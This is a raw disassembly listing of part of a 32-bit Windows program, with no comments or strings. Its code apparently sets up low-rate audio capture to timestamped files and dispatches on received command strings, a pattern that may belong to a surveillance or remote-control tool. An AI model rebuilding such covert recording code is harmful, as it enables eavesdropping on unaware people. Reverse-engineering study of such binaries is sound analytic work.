  40176b:	6a 04                	push   $0x4
  40176d:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  401773:	5f                   	pop    %edi
  401774:	57                   	push   %edi
  401775:	68 a8 05 41 00       	push   $0x4105a8
  40177a:	ff 15 7c 02 41 00    	call   *0x41027c
  401780:	8d 45 08             	lea    0x8(%ebp),%eax
  401783:	57                   	push   %edi
  401784:	50                   	push   %eax
  401785:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  40178b:	ff 15 7c 02 41 00    	call   *0x41027c
  401791:	57                   	push   %edi
  401792:	68 a0 05 41 00       	push   $0x4105a0
  401797:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  40179d:	ff 15 7c 02 41 00    	call   *0x41027c
  4017a3:	57                   	push   %edi
  4017a4:	68 98 05 41 00       	push   $0x410598
  4017a9:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  4017af:	ff 15 7c 02 41 00    	call   *0x41027c
  4017b5:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4017b8:	57                   	push   %edi
  4017b9:	50                   	push   %eax
  4017ba:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  4017c0:	ff 15 7c 02 41 00    	call   *0x41027c
  4017c6:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4017c9:	6a 02                	push   $0x2
  4017cb:	50                   	push   %eax
  4017cc:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  4017d2:	ff 15 7c 02 41 00    	call   *0x41027c
  4017d8:	6a 02                	push   $0x2
  4017da:	68 da 51 41 00       	push   $0x4151da
  4017df:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  4017e5:	ff 15 7c 02 41 00    	call   *0x41027c
  4017eb:	57                   	push   %edi
  4017ec:	68 dc 51 41 00       	push   $0x4151dc
  4017f1:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  4017f7:	ff 15 7c 02 41 00    	call   *0x41027c
  4017fd:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401800:	57                   	push   %edi
  401801:	50                   	push   %eax
  401802:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  401808:	ff 15 7c 02 41 00    	call   *0x41027c
  40180e:	8d 45 f8             	lea    -0x8(%ebp),%eax
  401811:	6a 02                	push   $0x2
  401813:	50                   	push   %eax
  401814:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  40181a:	ff 15 7c 02 41 00    	call   *0x41027c
  401820:	6a 02                	push   $0x2
  401822:	68 e6 51 41 00       	push   $0x4151e6
  401827:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  40182d:	ff 15 7c 02 41 00    	call   *0x41027c
  401833:	57                   	push   %edi
  401834:	68 90 05 41 00       	push   $0x410590
  401839:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  40183f:	ff 15 7c 02 41 00    	call   *0x41027c
  401845:	8d 45 f0             	lea    -0x10(%ebp),%eax
  401848:	57                   	push   %edi
  401849:	50                   	push   %eax
  40184a:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  401850:	ff 15 7c 02 41 00    	call   *0x41027c
  401856:	ff 76 04             	push   0x4(%esi)
  401859:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  40185f:	ff 36                	push   (%esi)
  401861:	ff 15 7c 02 41 00    	call   *0x41027c
  401867:	8d 8d 58 ff ff ff    	lea    -0xa8(%ebp),%ecx
  40186d:	ff 15 78 02 41 00    	call   *0x410278
  401873:	8d 8d 58 ff ff ff    	lea    -0xa8(%ebp),%ecx
  401879:	ff 15 74 02 41 00    	call   *0x410274
  40187f:	5f                   	pop    %edi
  401880:	5e                   	pop    %esi
  401881:	c9                   	leave
  401882:	c3                   	ret
  401883:	56                   	push   %esi
  401884:	57                   	push   %edi
  401885:	33 ff                	xor    %edi,%edi
  401887:	b9 a8 51 41 00       	mov    $0x4151a8,%ecx
  40188c:	57                   	push   %edi
  40188d:	ff 15 58 02 41 00    	call   *0x410258
  401893:	50                   	push   %eax
  401894:	ff 15 84 01 41 00    	call   *0x410184
  40189a:	b8 40 1f 00 00       	mov    $0x1f40,%eax
  40189f:	6a 24                	push   $0x24
  4018a1:	b9 40 59 41 00       	mov    $0x415940,%ecx
  4018a6:	66 c7 05 d8 51 41 00 	movw   $0x1,0x4151d8
  4018ad:	01 00 
  4018af:	66 c7 05 da 51 41 00 	movw   $0x1,0x4151da
  4018b6:	01 00 
  4018b8:	a3 dc 51 41 00       	mov    %eax,0x4151dc
  4018bd:	66 c7 05 e6 51 41 00 	movw   $0x8,0x4151e6
  4018c4:	08 00 
  4018c6:	a3 e0 51 41 00       	mov    %eax,0x4151e0
  4018cb:	66 c7 05 e4 51 41 00 	movw   $0x1,0x4151e4
  4018d2:	01 00 
  4018d4:	66 89 3d e8 51 41 00 	mov    %di,0x4151e8
  4018db:	e8 a9 f9 ff ff       	call   0x401289
  4018e0:	8b c8                	mov    %eax,%ecx
  4018e2:	ff 15 58 02 41 00    	call   *0x410258
  4018e8:	50                   	push   %eax
  4018e9:	ff 15 9c 03 41 00    	call   *0x41039c
  4018ef:	6b c0 3c             	imul   $0x3c,%eax,%eax
  4018f2:	8b 0d dc 51 41 00    	mov    0x4151dc,%ecx
  4018f8:	c7 04 24 08 00 03 00 	movl   $0x30008,(%esp)
  4018ff:	0f af c8             	imul   %eax,%ecx
  401902:	0f b7 05 e6 51 41 00 	movzwl 0x4151e6,%eax
  401909:	c1 e8 03             	shr    $0x3,%eax
  40190c:	0f af c1             	imul   %ecx,%eax
  40190f:	57                   	push   %edi
  401910:	68 aa 19 40 00       	push   $0x4019aa
  401915:	68 d8 51 41 00       	push   $0x4151d8
  40191a:	6a ff                	push   $0xffffffff
  40191c:	68 d0 51 41 00       	push   $0x4151d0
  401921:	89 0d 90 51 41 00    	mov    %ecx,0x415190
  401927:	a3 98 51 41 00       	mov    %eax,0x415198
  40192c:	ff 15 80 04 41 00    	call   *0x410480
  401932:	ff 35 98 51 41 00    	push   0x415198
  401938:	be 80 51 41 00       	mov    $0x415180,%esi
  40193d:	8b ce                	mov    %esi,%ecx
  40193f:	ff 15 5c 02 41 00    	call   *0x41025c
  401945:	8b ce                	mov    %esi,%ecx
  401947:	ff 15 58 02 41 00    	call   *0x410258
  40194d:	be 60 51 41 00       	mov    $0x415160,%esi
  401952:	6a 20                	push   $0x20
  401954:	56                   	push   %esi
  401955:	a3 60 51 41 00       	mov    %eax,0x415160
  40195a:	a1 98 51 41 00       	mov    0x415198,%eax
  40195f:	ff 35 d0 51 41 00    	push   0x4151d0
  401965:	a3 64 51 41 00       	mov    %eax,0x415164
  40196a:	89 3d 68 51 41 00    	mov    %edi,0x415168
  401970:	89 3d 6c 51 41 00    	mov    %edi,0x41516c
  401976:	89 3d 70 51 41 00    	mov    %edi,0x415170
  40197c:	89 3d 74 51 41 00    	mov    %edi,0x415174
  401982:	ff 15 90 04 41 00    	call   *0x410490
  401988:	6a 20                	push   $0x20
  40198a:	56                   	push   %esi
  40198b:	ff 35 d0 51 41 00    	push   0x4151d0
  401991:	ff 15 8c 04 41 00    	call   *0x41048c
  401997:	ff 35 d0 51 41 00    	push   0x4151d0
  40199d:	ff 15 98 04 41 00    	call   *0x410498
  4019a3:	5f                   	pop    %edi
  4019a4:	33 c0                	xor    %eax,%eax
  4019a6:	5e                   	pop    %esi
  4019a7:	c2 04 00             	ret    $0x4
  4019aa:	55                   	push   %ebp
  4019ab:	8b ec                	mov    %esp,%ebp
  4019ad:	81 ec a8 00 00 00    	sub    $0xa8,%esp
  4019b3:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4019b6:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4019b9:	50                   	push   %eax
  4019ba:	ff 15 50 02 41 00    	call   *0x410250
  4019c0:	81 7d 0c c0 03 00 00 	cmpl   $0x3c0,0xc(%ebp)
  4019c7:	0f 85 24 01 00 00    	jne    0x401af1
  4019cd:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4019d0:	56                   	push   %esi
  4019d1:	50                   	push   %eax
  4019d2:	ff 15 8c 03 41 00    	call   *0x41038c
  4019d8:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4019db:	50                   	push   %eax
  4019dc:	ff 15 90 03 41 00    	call   *0x410390
  4019e2:	50                   	push   %eax
  4019e3:	68 b8 05 41 00       	push   $0x4105b8
  4019e8:	8d 85 58 ff ff ff    	lea    -0xa8(%ebp),%eax
  4019ee:	6a 50                	push   $0x50
  4019f0:	50                   	push   %eax
  4019f1:	ff 15 94 03 41 00    	call   *0x410394
  4019f7:	8d 85 58 ff ff ff    	lea    -0xa8(%ebp),%eax
  4019fd:	50                   	push   %eax
  4019fe:	ff 15 98 03 41 00    	call   *0x410398
  401a04:	83 c4 1c             	add    $0x1c,%esp
  401a07:	8d 45 0f             	lea    0xf(%ebp),%eax
  401a0a:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  401a0d:	68 b0 05 41 00       	push   $0x4105b0
  401a12:	50                   	push   %eax
  401a13:	8d 85 58 ff ff ff    	lea    -0xa8(%ebp),%eax
  401a19:	50                   	push   %eax
  401a1a:	ff 15 4c 02 41 00    	call   *0x41024c
  401a20:	50                   	push   %eax
  401a21:	6a 5c                	push   $0x5c
  401a23:	8d 45 c8             	lea    -0x38(%ebp),%eax
  401a26:	68 a8 51 41 00       	push   $0x4151a8
  401a2b:	50                   	push   %eax
  401a2c:	e8 f5 e1 00 00       	call   0x40fc26
  401a31:	83 c4 0c             	add    $0xc,%esp
  401a34:	50                   	push   %eax
  401a35:	8d 45 a8             	lea    -0x58(%ebp),%eax
  401a38:	50                   	push   %eax
  401a39:	e8 d6 e1 00 00       	call   0x40fc14
  401a3e:	83 c4 0c             	add    $0xc,%esp
  401a41:	50                   	push   %eax
  401a42:	8d 45 d8             	lea    -0x28(%ebp),%eax
  401a45:	50                   	push   %eax
  401a46:	e8 d5 e1 00 00       	call   0x40fc20
  401a4b:	83 c4 0c             	add    $0xc,%esp
  401a4e:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  401a51:	50                   	push   %eax
  401a52:	ff 15 64 02 41 00    	call   *0x410264
  401a58:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  401a5b:	ff 15 54 02 41 00    	call   *0x410254
  401a61:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  401a64:	ff 15 54 02 41 00    	call   *0x410254
  401a6a:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  401a6d:	ff 15 54 02 41 00    	call   *0x410254
  401a73:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  401a76:	ff 15 54 02 41 00    	call   *0x410254
  401a7c:	be 60 51 41 00       	mov    $0x415160,%esi
  401a81:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  401a84:	56                   	push   %esi
  401a85:	ff 15 58 02 41 00    	call   *0x410258
  401a8b:	50                   	push   %eax
  401a8c:	e8 65 fc ff ff       	call   0x4016f6
  401a91:	59                   	pop    %ecx
  401a92:	59                   	pop    %ecx
  401a93:	6a 20                	push   $0x20
  401a95:	56                   	push   %esi
  401a96:	ff 35 d0 51 41 00    	push   0x4151d0
  401a9c:	ff 15 94 04 41 00    	call   *0x410494
  401aa2:	b9 80 51 41 00       	mov    $0x415180,%ecx
  401aa7:	ff 15 58 02 41 00    	call   *0x410258
  401aad:	a3 60 51 41 00       	mov    %eax,0x415160
  401ab2:	a1 98 51 41 00       	mov    0x415198,%eax
  401ab7:	6a 20                	push   $0x20
  401ab9:	56                   	push   %esi
  401aba:	ff 35 d0 51 41 00    	push   0x4151d0
  401ac0:	a3 64 51 41 00       	mov    %eax,0x415164
  401ac5:	33 c0                	xor    %eax,%eax
  401ac7:	a3 68 51 41 00       	mov    %eax,0x415168
  401acc:	a3 6c 51 41 00       	mov    %eax,0x41516c
  401ad1:	a3 70 51 41 00       	mov    %eax,0x415170
  401ad6:	a3 74 51 41 00       	mov    %eax,0x415174
  401adb:	ff 15 90 04 41 00    	call   *0x410490
  401ae1:	6a 20                	push   $0x20
  401ae3:	56                   	push   %esi
  401ae4:	ff 35 d0 51 41 00    	push   0x4151d0
  401aea:	ff 15 8c 04 41 00    	call   *0x41048c
  401af0:	5e                   	pop    %esi
  401af1:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  401af4:	ff 15 54 02 41 00    	call   *0x410254
  401afa:	c9                   	leave
  401afb:	c2 14 00             	ret    $0x14
  401afe:	55                   	push   %ebp
  401aff:	8b ec                	mov    %esp,%ebp
  401b01:	8b 45 10             	mov    0x10(%ebp),%eax
  401b04:	56                   	push   %esi
  401b05:	57                   	push   %edi
  401b06:	8b 7d 08             	mov    0x8(%ebp),%edi
  401b09:	8a 00                	mov    (%eax),%al
  401b0b:	8b f1                	mov    %ecx,%esi
  401b0d:	6a 00                	push   $0x0
  401b0f:	57                   	push   %edi
  401b10:	88 06                	mov    %al,(%esi)
  401b12:	e8 9e 00 00 00       	call   0x401bb5
  401b17:	ff 75 0c             	push   0xc(%ebp)
  401b1a:	8b ce                	mov    %esi,%ecx
  401b1c:	89 46 04             	mov    %eax,0x4(%esi)
  401b1f:	57                   	push   %edi
  401b20:	50                   	push   %eax
  401b21:	e8 67 00 00 00       	call   0x401b8d
  401b26:	8b 46 04             	mov    0x4(%esi),%eax
  401b29:	c1 e7 04             	shl    $0x4,%edi
  401b2c:	03 c7                	add    %edi,%eax
  401b2e:	5f                   	pop    %edi
  401b2f:	89 46 08             	mov    %eax,0x8(%esi)
  401b32:	89 46 0c             	mov    %eax,0xc(%esi)
  401b35:	8b c6                	mov    %esi,%eax
  401b37:	5e                   	pop    %esi
  401b38:	5d                   	pop    %ebp
  401b39:	c2 0c 00             	ret    $0xc
  401b3c:	56                   	push   %esi
  401b3d:	8b f1                	mov    %ecx,%esi
  401b3f:	ff 76 08             	push   0x8(%esi)
  401b42:	ff 76 04             	push   0x4(%esi)
  401b45:	e8 21 00 00 00       	call   0x401b6b
  401b4a:	8b 46 04             	mov    0x4(%esi),%eax
  401b4d:	8b 4e 0c             	mov    0xc(%esi),%ecx
  401b50:	2b c8                	sub    %eax,%ecx
  401b52:	c1 f9 04             	sar    $0x4,%ecx
  401b55:	51                   	push   %ecx
  401b56:	50                   	push   %eax
  401b57:	8b ce                	mov    %esi,%ecx
  401b59:	e8 c8 1a 00 00       	call   0x403626
  401b5e:	33 c0                	xor    %eax,%eax
  401b60:	89 46 04             	mov    %eax,0x4(%esi)
  401b63:	89 46 08             	mov    %eax,0x8(%esi)
  401b66:	89 46 0c             	mov    %eax,0xc(%esi)
  401b69:	5e                   	pop    %esi
  401b6a:	c3                   	ret
  401b6b:	55                   	push   %ebp
  401b6c:	8b ec                	mov    %esp,%ebp
  401b6e:	56                   	push   %esi
  401b6f:	8b 75 08             	mov    0x8(%ebp),%esi
  401b72:	57                   	push   %edi
  401b73:	8b f9                	mov    %ecx,%edi
  401b75:	3b 75 0c             	cmp    0xc(%ebp),%esi
  401b78:	74 0d                	je     0x401b87
  401b7a:	56                   	push   %esi
  401b7b:	8b cf                	mov    %edi,%ecx
  401b7d:	e8 5a 00 00 00       	call   0x401bdc
  401b82:	83 c6 10             	add    $0x10,%esi
  401b85:	eb ee                	jmp    0x401b75
  401b87:	5f                   	pop    %edi
  401b88:	5e                   	pop    %esi
  401b89:	5d                   	pop    %ebp
  401b8a:	c2 08 00             	ret    $0x8
  401b8d:	55                   	push   %ebp
  401b8e:	8b ec                	mov    %esp,%ebp
  401b90:	56                   	push   %esi
  401b91:	8b 75 0c             	mov    0xc(%ebp),%esi
  401b94:	57                   	push   %edi
  401b95:	8b f9                	mov    %ecx,%edi
  401b97:	85 f6                	test   %esi,%esi
  401b99:	76 14                	jbe    0x401baf
  401b9b:	ff 75 10             	push   0x10(%ebp)
  401b9e:	8b cf                	mov    %edi,%ecx
  401ba0:	ff 75 08             	push   0x8(%ebp)
  401ba3:	e8 20 00 00 00       	call   0x401bc8
  401ba8:	83 45 08 10          	addl   $0x10,0x8(%ebp)
  401bac:	4e                   	dec    %esi
  401bad:	75 ec                	jne    0x401b9b
  401baf:	5f                   	pop    %edi
  401bb0:	5e                   	pop    %esi
  401bb1:	5d                   	pop    %ebp
  401bb2:	c2 0c 00             	ret    $0xc
  401bb5:	55                   	push   %ebp
  401bb6:	8b ec                	mov    %esp,%ebp
  401bb8:	6a 00                	push   $0x0
  401bba:	ff 75 08             	push   0x8(%ebp)
  401bbd:	e8 2a 00 00 00       	call   0x401bec
  401bc2:	59                   	pop    %ecx
  401bc3:	59                   	pop    %ecx
  401bc4:	5d                   	pop    %ebp
  401bc5:	c2 08 00             	ret    $0x8
  401bc8:	55                   	push   %ebp
  401bc9:	8b ec                	mov    %esp,%ebp
  401bcb:	ff 75 0c             	push   0xc(%ebp)
  401bce:	ff 75 08             	push   0x8(%ebp)
  401bd1:	e8 2e 00 00 00       	call   0x401c04
  401bd6:	59                   	pop    %ecx
  401bd7:	59                   	pop    %ecx
  401bd8:	5d                   	pop    %ebp
  401bd9:	c2 08 00             	ret    $0x8
  401bdc:	55                   	push   %ebp
  401bdd:	8b ec                	mov    %esp,%ebp
  401bdf:	ff 75 08             	push   0x8(%ebp)
  401be2:	e8 45 00 00 00       	call   0x401c2c
  401be7:	59                   	pop    %ecx
  401be8:	5d                   	pop    %ebp
  401be9:	c2 04 00             	ret    $0x4
  401bec:	55                   	push   %ebp
  401bed:	8b ec                	mov    %esp,%ebp
  401bef:	8b 45 08             	mov    0x8(%ebp),%eax
  401bf2:	85 c0                	test   %eax,%eax
  401bf4:	7d 02                	jge    0x401bf8
  401bf6:	33 c0                	xor    %eax,%eax
  401bf8:	c1 e0 04             	shl    $0x4,%eax
  401bfb:	50                   	push   %eax
  401bfc:	e8 cb e0 00 00       	call   0x40fccc
  401c01:	59                   	pop    %ecx
  401c02:	5d                   	pop    %ebp
  401c03:	c3                   	ret
  401c04:	55                   	push   %ebp
  401c05:	8b ec                	mov    %esp,%ebp
  401c07:	ff 75 08             	push   0x8(%ebp)
  401c0a:	6a 10                	push   $0x10
  401c0c:	e8 13 00 00 00       	call   0x401c24
  401c11:	59                   	pop    %ecx
  401c12:	85 c0                	test   %eax,%eax
  401c14:	59                   	pop    %ecx
  401c15:	74 0b                	je     0x401c22
  401c17:	ff 75 0c             	push   0xc(%ebp)
  401c1a:	8b c8                	mov    %eax,%ecx
  401c1c:	ff 15 60 02 41 00    	call   *0x410260
  401c22:	5d                   	pop    %ebp
  401c23:	c3                   	ret
  401c24:	55                   	push   %ebp
  401c25:	8b ec                	mov    %esp,%ebp
  401c27:	8b 45 0c             	mov    0xc(%ebp),%eax
  401c2a:	5d                   	pop    %ebp
  401c2b:	c3                   	ret
  401c2c:	55                   	push   %ebp
  401c2d:	8b ec                	mov    %esp,%ebp
  401c2f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401c32:	6a 00                	push   $0x0
  401c34:	e8 02 00 00 00       	call   0x401c3b
  401c39:	5d                   	pop    %ebp
  401c3a:	c3                   	ret
  401c3b:	55                   	push   %ebp
  401c3c:	8b ec                	mov    %esp,%ebp
  401c3e:	56                   	push   %esi
  401c3f:	8b f1                	mov    %ecx,%esi
  401c41:	ff 15 54 02 41 00    	call   *0x410254
  401c47:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  401c4b:	74 07                	je     0x401c54
  401c4d:	56                   	push   %esi
  401c4e:	e8 d9 df 00 00       	call   0x40fc2c
  401c53:	59                   	pop    %ecx
  401c54:	8b c6                	mov    %esi,%eax
  401c56:	5e                   	pop    %esi
  401c57:	5d                   	pop    %ebp
  401c58:	c2 04 00             	ret    $0x4
  401c5b:	e8 05 00 00 00       	call   0x401c65
  401c60:	e9 15 00 00 00       	jmp    0x401c7a
  401c65:	55                   	push   %ebp
  401c66:	8b ec                	mov    %esp,%ebp
  401c68:	51                   	push   %ecx
  401c69:	8d 45 ff             	lea    -0x1(%ebp),%eax
  401c6c:	b9 f0 51 41 00       	mov    $0x4151f0,%ecx
  401c71:	50                   	push   %eax
  401c72:	ff 15 50 02 41 00    	call   *0x410250
  401c78:	c9                   	leave
  401c79:	c3                   	ret
  401c7a:	68 86 1c 40 00       	push   $0x401c86
  401c7f:	e8 36 e0 00 00       	call   0x40fcba
  401c84:	59                   	pop    %ecx
  401c85:	c3                   	ret
  401c86:	b9 f0 51 41 00       	mov    $0x4151f0,%ecx
  401c8b:	ff 25 54 02 41 00    	jmp    *0x410254
  401c91:	e8 05 00 00 00       	call   0x401c9b
  401c96:	e9 0d 00 00 00       	jmp    0x401ca8
  401c9b:	6a 00                	push   $0x0
  401c9d:	b9 00 52 41 00       	mov    $0x415200,%ecx
  401ca2:	e8 3a 04 00 00       	call   0x4020e1
  401ca7:	c3                   	ret
  401ca8:	68 b4 1c 40 00       	push   $0x401cb4
  401cad:	e8 08 e0 00 00       	call   0x40fcba
  401cb2:	59                   	pop    %ecx
  401cb3:	c3                   	ret
  401cb4:	b9 00 52 41 00       	mov    $0x415200,%ecx
  401cb9:	e9 18 05 00 00       	jmp    0x4021d6
  401cbe:	55                   	push   %ebp
  401cbf:	8b ec                	mov    %esp,%ebp
  401cc1:	83 ec 30             	sub    $0x30,%esp
  401cc4:	56                   	push   %esi
  401cc5:	57                   	push   %edi
  401cc6:	83 ec 10             	sub    $0x10,%esp
  401cc9:	bf 68 52 41 00       	mov    $0x415268,%edi
  401cce:	8b cc                	mov    %esp,%ecx
  401cd0:	57                   	push   %edi
  401cd1:	ff 15 60 02 41 00    	call   *0x410260
  401cd7:	83 ec 10             	sub    $0x10,%esp
  401cda:	8d 45 0c             	lea    0xc(%ebp),%eax
  401cdd:	8b cc                	mov    %esp,%ecx
  401cdf:	50                   	push   %eax
  401ce0:	ff 15 60 02 41 00    	call   *0x410260
  401ce6:	8d 45 e0             	lea    -0x20(%ebp),%eax
  401ce9:	50                   	push   %eax
  401cea:	e8 c6 d2 00 00       	call   0x40efb5
  401cef:	83 c4 24             	add    $0x24,%esp
  401cf2:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  401cf5:	6a 00                	push   $0x0
  401cf7:	e8 8d f5 ff ff       	call   0x401289
  401cfc:	50                   	push   %eax
  401cfd:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  401d00:	ff 15 60 02 41 00    	call   *0x410260
  401d06:	8b 35 38 02 41 00    	mov    0x410238,%esi
  401d0c:	8d 45 f0             	lea    -0x10(%ebp),%eax
  401d0f:	68 48 06 41 00       	push   $0x410648
  401d14:	50                   	push   %eax
  401d15:	ff d6                	call   *%esi
  401d17:	59                   	pop    %ecx
  401d18:	84 c0                	test   %al,%al
  401d1a:	59                   	pop    %ecx
  401d1b:	0f 84 a0 00 00 00    	je     0x401dc1
  401d21:	6a 01                	push   $0x1
  401d23:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  401d26:	e8 5e f5 ff ff       	call   0x401289
  401d2b:	8b c8                	mov    %eax,%ecx
  401d2d:	ff 15 34 02 41 00    	call   *0x410234
  401d33:	50                   	push   %eax
  401d34:	e8 b3 35 00 00       	call   0x4052ec
  401d39:	8b f0                	mov    %eax,%esi
  401d3b:	59                   	pop    %ecx
  401d3c:	85 f6                	test   %esi,%esi
  401d3e:	0f 84 d6 01 00 00    	je     0x401f1a
  401d44:	68 3c 06 41 00       	push   $0x41063c
  401d49:	56                   	push   %esi
  401d4a:	e8 f7 37 00 00       	call   0x405546
  401d4f:	68 30 06 41 00       	push   $0x410630
  401d54:	56                   	push   %esi
  401d55:	a3 44 52 41 00       	mov    %eax,0x415244
  401d5a:	e8 e7 37 00 00       	call   0x405546
  401d5f:	68 24 06 41 00       	push   $0x410624
  401d64:	56                   	push   %esi
  401d65:	a3 48 52 41 00       	mov    %eax,0x415248
  401d6a:	e8 d7 37 00 00       	call   0x405546
  401d6f:	68 18 06 41 00       	push   $0x410618
  401d74:	56                   	push   %esi
  401d75:	a3 4c 52 41 00       	mov    %eax,0x41524c
  401d7a:	e8 c7 37 00 00       	call   0x405546
  401d7f:	83 c4 10             	add    $0x10,%esp
  401d82:	a3 50 52 41 00       	mov    %eax,0x415250
  401d87:	8b f4                	mov    %esp,%esi
  401d89:	8d 45 d0             	lea    -0x30(%ebp),%eax
  401d8c:	68 f0 51 41 00       	push   $0x4151f0
  401d91:	57                   	push   %edi
  401d92:	68 0c 06 41 00       	push   $0x41060c
  401d97:	50                   	push   %eax
  401d98:	c6 05 40 52 41 00 01 	movb   $0x1,0x415240
  401d9f:	e8 76 de 00 00       	call   0x40fc1a
  401da4:	83 c4 0c             	add    $0xc,%esp
  401da7:	50                   	push   %eax
  401da8:	56                   	push   %esi
  401da9:	e8 66 de 00 00       	call   0x40fc14
  401dae:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401db1:	83 c4 0c             	add    $0xc,%esp
  401db4:	e8 df 03 00 00       	call   0x402198
  401db9:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  401dbc:	e9 53 01 00 00       	jmp    0x401f14
  401dc1:	8d 45 f0             	lea    -0x10(%ebp),%eax
  401dc4:	68 00 06 41 00       	push   $0x410600
  401dc9:	50                   	push   %eax
  401dca:	ff d6                	call   *%esi
  401dcc:	59                   	pop    %ecx
  401dcd:	84 c0                	test   %al,%al
  401dcf:	59                   	pop    %ecx
  401dd0:	74 0f                	je     0x401de1
  401dd2:	80 3d 41 52 41 00 00 	cmpb   $0x0,0x415241
  401dd9:	0f 84 3b 01 00 00    	je     0x401f1a
  401ddf:	eb 43                	jmp    0x401e24
  401de1:	8d 45 f0             	lea    -0x10(%ebp),%eax
  401de4:	68 f4 05 41 00       	push   $0x4105f4
  401de9:	50                   	push   %eax
  401dea:	ff d6                	call   *%esi
  401dec:	59                   	pop    %ecx
  401ded:	84 c0                	test   %al,%al
  401def:	59                   	pop    %ecx
  401df0:	74 12                	je     0x401e04
  401df2:	ff 15 48 52 41 00    	call   *0x415248
  401df8:	80 25 41 52 41 00 00 	andb   $0x0,0x415241
  401dff:	e9 16 01 00 00       	jmp    0x401f1a
  401e04:	8d 45 f0             	lea    -0x10(%ebp),%eax
  401e07:	68 e8 05 41 00       	push   $0x4105e8
  401e0c:	50                   	push   %eax
  401e0d:	ff d6                	call   *%esi
  401e0f:	59                   	pop    %ecx
  401e10:	84 c0                	test   %al,%al
  401e12:	59                   	pop    %ecx
  401e13:	74 6f                	je     0x401e84
  401e15:	ff 15 44 52 41 00    	call   *0x415244
  401e1b:	84 c0                	test   %al,%al
  401e1d:	a2 41 52 41 00       	mov    %al,0x415241
  401e22:	74 2a                	je     0x401e4e
  401e24:	6a 01                	push   $0x1
  401e26:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  401e29:	e8 5b f4 ff ff       	call   0x401289
  401e2e:	8b c8                	mov    %eax,%ecx
  401e30:	ff 15 58 02 41 00    	call   *0x410258
  401e36:	50                   	push   %eax
  401e37:	ff 15 9c 03 41 00    	call   *0x41039c
  401e3d:	50                   	push   %eax
  401e3e:	ff 75 08             	push   0x8(%ebp)
  401e41:	e8 f4 00 00 00       	call   0x401f3a
  401e46:	83 c4 0c             	add    $0xc,%esp
  401e49:	e9 cc 00 00 00       	jmp    0x401f1a
  401e4e:	83 ec 10             	sub    $0x10,%esp
  401e51:	8d 45 d0             	lea    -0x30(%ebp),%eax
  401e54:	8b f4                	mov    %esp,%esi
  401e56:	68 f0 51 41 00       	push   $0x4151f0
  401e5b:	57                   	push   %edi
  401e5c:	68 dc 05 41 00       	push   $0x4105dc
  401e61:	50                   	push   %eax
  401e62:	e8 b3 dd 00 00       	call   0x40fc1a
  401e67:	83 c4 0c             	add    $0xc,%esp
  401e6a:	50                   	push   %eax
  401e6b:	56                   	push   %esi
  401e6c:	e8 a3 dd 00 00       	call   0x40fc14
  401e71:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401e74:	83 c4 0c             	add    $0xc,%esp
  401e77:	e8 1c 03 00 00       	call   0x402198
  401e7c:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  401e7f:	e9 90 00 00 00       	jmp    0x401f14
  401e84:	8d 45 f0             	lea    -0x10(%ebp),%eax
  401e87:	68 c8 05 41 00       	push   $0x4105c8
  401e8c:	50                   	push   %eax
  401e8d:	ff d6                	call   *%esi
  401e8f:	59                   	pop    %ecx
  401e90:	84 c0                	test   %al,%al
  401e92:	59                   	pop    %ecx
  401e93:	0f 84 81 00 00 00    	je     0x401f1a
  401e99:	ff 15 44 52 41 00    	call   *0x415244
  401e9f:	84 c0                	test   %al,%al
  401ea1:	a2 41 52 41 00       	mov    %al,0x415241
  401ea6:	74 3b                	je     0x401ee3
  401ea8:	6a 01                	push   $0x1
  401eaa:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  401ead:	e8 d7 f3 ff ff       	call   0x401289
  401eb2:	8b c8                	mov    %eax,%ecx
  401eb4:	ff 15 58 02 41 00    	call   *0x410258
  401eba:	50                   	push   %eax
  401ebb:	ff 15 9c 03 41 00    	call   *0x41039c
  401ec1:	8b f0                	mov    %eax,%esi
  401ec3:	c7 04 24 e8 03 00 00 	movl   $0x3e8,(%esp)
  401eca:	ff 15 8c 01 41 00    	call   *0x41018c
  401ed0:	56                   	push   %esi
  401ed1:	ff 75 08             	push   0x8(%ebp)
  401ed4:	e8 61 00 00 00       	call   0x401f3a
  401ed9:	59                   	pop    %ecx
  401eda:	59                   	pop    %ecx
  401edb:	ff 15 48 52 41 00    	call   *0x415248
  401ee1:	eb 37                	jmp    0x401f1a
  401ee3:	83 ec 10             	sub    $0x10,%esp
